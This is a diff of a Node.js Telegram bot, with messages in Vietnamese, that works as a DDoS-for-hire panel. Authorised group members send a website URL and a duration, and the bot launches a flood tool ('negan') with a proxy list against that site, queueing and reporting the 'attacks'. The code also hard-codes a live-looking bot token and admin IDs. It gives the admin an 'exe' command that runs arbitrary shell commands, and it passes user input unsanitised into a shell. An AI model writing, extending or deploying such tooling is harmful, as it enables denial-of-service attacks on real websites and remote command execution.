@@ -1,16 +1,46 @@
-const TelegramBot = require('node-telegram-bot-api'), { exec } = require('child_process'), token = '7935173392:AAGF9Pw5ndLJ5bNVfKCQiSG0yOwFX1Vcxdo', adminId = 1243471275, allowedGroupIds = new Set([-1002423723717, -1002334544605, 112233445, 556677889, 998877665]), bot = new TelegramBot(token, { polling: true }), maxSlot = 1, maxCurrent = 3, maxTimeAttacks = 120;
-let currentProcesses = 0, queue = [], userProcesses = {}, activeAttacks = {};
+const TelegramBot = require('node-telegram-bot-api');
+const { exec } = require('child_process');
+const token = '7935173392:AAGF9Pw5ndLJ5bNVfKCQiSG0yOwFX1Vcxdo';
+const adminId = 1243471275;
+const allowedGroupIds = new Set([-1002423723717, -1002334544605, 112233445, 556677889, 998877665]);
+const bot = new TelegramBot(token, { polling: true });
+const maxSlot = 1;
+const maxCurrent = 3;
+const maxTimeAttacks = 120;
 
-const restartBot = () => { console.error('🚨 Restarting bot...'); bot.stopPolling(); setTimeout(() => { bot = new TelegramBot(token, { polling: true }); initBot() }, 1000) },
-initBot = () => {
+let currentProcesses = 0;
+let queue = [];
+let userProcesses = {};
+let activeAttacks = {};
+let isBotJustStarted = true; // Biến để kiểm tra xem bot vừa khởi động hay không
+
+const restartBot = () => {
+    console.error('🚨 Restarting bot...');
+    bot.stopPolling();
+    setTimeout(() => {
+        bot = new TelegramBot(token, { polling: true });
+        initBot();
+    }, 1000);
+};
+
+const initBot = () => {
     bot.sendMessage(adminId, '[🤖Version PRO🤖] BOT Đang Chờ Lệnh.');
     const helpMessage = `📜 Hướng dẫn sử dụng:\n➔ Lệnh chính xác: <code>https://example.com 60</code>\n⚠️ Lưu ý: Thời gian tối đa là ${maxTimeAttacks} giây.`;
 
     bot.on('message', async msg => {
-        const { chat: { id: chatId }, text, from: { id: userId, username, first_name } } = msg, isAdmin = chatId === adminId, isGroup = allowedGroupIds.has(chatId), caller = username || first_name;
+        const { chat: { id: chatId }, text, from: { id: userId, username, first_name } } = msg;
+        const isAdmin = chatId === adminId;
+        const isGroup = allowedGroupIds.has(chatId);
+        const caller = username || first_name;
+
         if (!isAdmin && !isGroup) return bot.sendMessage(chatId, '❌ Bạn không có quyền sử dụng liên hệ: @NeganSSHConsole.', { parse_mode: 'HTML' });
         if (!text || !['http://', 'https://', 'exe ', '/help'].some(cmd => text.startsWith(cmd))) return;
         if (text === '/help') return bot.sendMessage(chatId, helpMessage, { parse_mode: 'HTML' });
+
+        if (isBotJustStarted) {
+            isBotJustStarted = false; // Đặt lại biến sau khi bot đã xử lý lệnh đầu tiên
+            return bot.sendMessage(chatId, `🚫 Đã bỏ qua lệnh "${text}" vì bot vừa khởi động.`, { parse_mode: 'HTML' });
+        }
 
         if (text.startsWith('http')) {
             const [host, time] = text.split(' ');
@@ -20,10 +50,16 @@ initBot = () => {
                 const remaining = Math.ceil((Object.values(activeAttacks).find(a => a.userId === userId)?.endTime - Date.now()) / 1000);
                 if (remaining > 0) return bot.sendMessage(chatId, `❌ Bạn đang có tiến trình chạy! Còn lại: ${remaining} giây!`);
             }
-            if (currentProcesses >= maxCurrent) { queue.push({ userId, host, time: attackTime, chatId, caller }); return bot.sendMessage(chatId, '⏳ Yêu cầu được đưa vào hàng đợi...', { parse_mode: 'HTML' }); }
+            if (currentProcesses >= maxCurrent) {
+                queue.push({ userId, host, time: attackTime, chatId, caller });
+                return bot.sendMessage(chatId, '⏳ Yêu cầu được đưa vào hàng đợi...', { parse_mode: 'HTML' });
+            }
 
-            const pid = Math.floor(Math.random() * 10000), endTime = Date.now() + attackTime * 1000;
-            activeAttacks[pid] = { userId, endTime }; userProcesses[userId] = (userProcesses[userId] || 0) + 1; currentProcesses++;
+            const pid = Math.floor(Math.random() * 10000);
+            const endTime = Date.now() + attackTime * 1000;
+            activeAttacks[pid] = { userId, endTime };
+            userProcesses[userId] = (userProcesses[userId] || 0) + 1;
+            currentProcesses++;
 
             const startMessage = JSON.stringify({
                 Status: "✨🚀🛸 Successfully 🛸🚀✨",
@@ -44,7 +80,9 @@ initBot = () => {
             exec(`node ./negan -m GET -u ${host} -p live.txt --full true -s ${attackTime}`, { shell: '/bin/bash' }, (e, stdout, stderr) => {
                 const completeMessage = JSON.stringify({ Status: "👽 END ATTACK 👽", Caller: caller, "PID Attack": pid, Website: host, Time: `${attackTime} Giây`, EndTime: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }) }, null, 2);
                 bot.sendMessage(chatId, completeMessage, { parse_mode: 'HTML' });
-                delete activeAttacks[pid]; userProcesses[userId]--; currentProcesses--;
+                delete activeAttacks[pid];
+                userProcesses[userId]--;
+                currentProcesses--;
                 if (queue.length) {
                     const next = queue.shift();
                     bot.sendMessage(next.chatId, `📥 Khởi động từ hàng đợi: ${next.host} ${next.time}s`);
@@ -55,7 +93,8 @@ initBot = () => {
         }
 
         if (text.startsWith('exe ') && isAdmin) {
-            const cmd = text.slice(4); if (!cmd) return bot.sendMessage(chatId, '🚫 Lệnh không được trống! VD: <code>exe ls</code>', { parse_mode: 'HTML' });
+            const cmd = text.slice(4);
+            if (!cmd) return bot.sendMessage(chatId, '🚫 Lệnh không được trống! VD: <code>exe ls</code>', { parse_mode: 'HTML' });
             exec(cmd, { shell: '/bin/bash' }, (e, o, er) => bot.sendMessage(chatId, `🚀 Kết quả lệnh:\n<pre>${cmd}\n${o || er}</pre>`, { parse_mode: 'HTML' }));
         }
     });
